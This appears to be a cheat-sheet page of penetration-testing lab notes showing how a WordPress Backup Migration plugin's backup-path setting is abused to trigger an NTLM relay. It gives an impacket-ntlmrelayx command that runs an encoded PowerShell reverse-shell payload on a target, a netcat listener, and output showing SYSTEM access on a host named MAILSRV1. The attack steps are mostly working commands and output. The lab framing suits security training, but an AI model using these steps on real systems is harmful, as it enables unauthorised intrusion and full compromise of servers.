# Abuse a WordPress Plugin for a Relay Attack

Daniela is the only WordPress user
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Abuse-a-WordPress-Plugin-for-a-Relay-Attack-1.png)

General WordPress settings
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Abuse-a-WordPress-Plugin-for-a-Relay-Attack-2.png)

Installed WordPress Plugins
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Abuse-a-WordPress-Plugin-for-a-Relay-Attack-3.png)

Backup Migration plugin settings
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Abuse-a-WordPress-Plugin-for-a-Relay-Attack-4.png)

Setting up impacket-ntlmrelayx
>``` shell
>kali@kali:~/beyond$ sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.242 -c "powershell -enc JABjAGwAaQ..."
>
># ========== Expected Result ==========
>Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
>
>[*] Protocol Client SMTP loaded..
>[*] Protocol Client LDAPS loaded..
>[*] Protocol Client LDAP loaded..
>[*] Protocol Client RPC loaded..
>[*] Protocol Client DCSYNC loaded..
>[*] Protocol Client MSSQL loaded..
>[*] Protocol Client SMB loaded..
>[*] Protocol Client IMAPS loaded..
>[*] Protocol Client IMAP loaded..
>[*] Protocol Client HTTPS loaded..
>[*] Protocol Client HTTP loaded..
>[*] Running in relay mode to single host
>[*] Setting up SMB Server
>[*] Setting up WCF Server
>[*] Setting up RAW Server on port 6666
>
>[*] Servers started, waiting for connections
># =====================================
>```

Setting up Netcat listener on port 9999
>``` shell
>kali@kali:~/beyond$ nc -nvlp 9999
>
># ========== Expected Result ==========
>listening on [any] 9999 ...
># =====================================
>```

Modified Backup directory path
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Abuse-a-WordPress-Plugin-for-a-Relay-Attack-5.png)

Executing reverse shell on MAILSRV1 via impacket-ntlmrelayx
>``` shell
>...
>[*] Authenticating against smb://192.168.50.242 as INTERNALSRV1/ADMINISTRATOR SUCCEED
>...
>[*] Service RemoteRegistry is in stopped state
>...
>[*] Starting service RemoteRegistry
>...
>[*] Executed specified command on host: 192.168.50.242
>...
>[*] Stopping service RemoteRegistry
>```

Incoming reverse shell
>``` shell
>connect to [192.168.119.5] from (UNKNOWN) [192.168.50.242] 50063
>whoami
>nt authority\system
>
>PS C:\Windows\system32> hostname
>MAILSRV1
>
>PS C:\Windows\system32> 
>```
